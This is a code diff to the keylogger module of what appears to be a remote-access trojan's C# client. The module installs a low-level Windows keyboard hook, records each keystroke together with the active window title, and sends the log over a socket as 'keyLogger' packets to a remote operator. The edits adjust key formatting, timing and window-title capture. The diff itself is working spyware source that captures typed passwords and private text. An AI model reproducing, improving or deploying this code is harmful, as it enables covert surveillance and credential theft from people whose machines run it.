@@ -26,7 +26,7 @@ namespace Client.Handle_Packet
             {
                 while (ClientSocket.IsConnected)
                 {
-                    Thread.Sleep(500);
+                    Thread.Sleep(10);
                     if (isON == false)
                     {
                         break;
@@ -34,6 +34,7 @@ namespace Client.Handle_Packet
                 }
                 UnhookWindowsHookEx(_hookID);
                 CurrentActiveWindowTitle = "";
+                Application.Exit();
             }).Start();
             Application.Run();
         }
@@ -75,13 +76,13 @@ namespace Client.Handle_Packet
                         switch (((Keys)vkCode).ToString())
                         {
                             case "Space":
-                                currentKey = "[SPACE]";
+                                currentKey = " ";
                                 break;
                             case "Return":
-                                currentKey = $"[ENTER]{Environment.NewLine}";
+                                currentKey = "[ENTER]\n";
                                 break;
-                            case "escape":
-                                currentKey = "[ESC]";
+                            case "Escape":
+                                currentKey = "[ESC]\n";
                                 break;
                             case "LControlKey":
                                 currentKey = "[CTRL]";
@@ -102,15 +103,8 @@ namespace Client.Handle_Packet
                                 currentKey = "[WIN]";
                                 break;
                             case "Tab":
-                                currentKey = "[Tab]";
+                                currentKey = "[Tab]\n";
                                 break;
-                            case "Capital":
-                                if (CapsLock == true)
-                                    currentKey = "[CAPSLOCK: OFF]";
-                                else
-                                    currentKey = "[CAPSLOCK: ON]";
-                                break;
-
                         }
                     }
 
@@ -130,7 +124,7 @@ namespace Client.Handle_Packet
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                     msgpack.ForcePathObject("log").AsString = sb.ToString();
-                    Sockets.ClientSocket.Send(msgpack.Encode2Bytes());
+                    ClientSocket.Send(msgpack.Encode2Bytes());
                 }
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
@@ -158,32 +152,13 @@ namespace Client.Handle_Packet
 
         private static string GetActiveWindowTitle()
         {
-            const int nChars = 256;
-            StringBuilder Buff = new StringBuilder(nChars);
-            IntPtr handle = GetForegroundWindow();
-
-            if (GetWindowText(handle, Buff, nChars) > 0)
-            {
-                CurrentActiveWindowTitle = Path.GetFileName(Buff.ToString());
-                return CurrentActiveWindowTitle;
-            }
-            else
-            {
-                return GetActiveProcessFileName();
-            }
-        }
-
-        private static string GetActiveProcessFileName()
-        {
             try
             {
-                string pName;
                 IntPtr hwnd = GetForegroundWindow();
                 GetWindowThreadProcessId(hwnd, out uint pid);
                 Process p = Process.GetProcessById((int)pid);
-                pName = Path.GetFileName(p.MainModule.FileName);
-
-                return pName;
+                CurrentActiveWindowTitle = p.MainWindowTitle;
+                return p.MainWindowTitle;
             }
             catch (Exception)
             {
@@ -191,13 +166,16 @@ namespace Client.Handle_Packet
             }
         }
 
-
         #region "Hooks & Native Methods"
 
         private const int WM_KEYDOWN = 0x0100;
         private static readonly LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static readonly int WHKEYBOARDLL = 13;
+        private static string CurrentActiveWindowTitle;
 
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -208,15 +186,8 @@ namespace Client.Handle_Packet
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        private static readonly int WHKEYBOARDLL = 13;
-
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
-        private static string CurrentActiveWindowTitle;
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
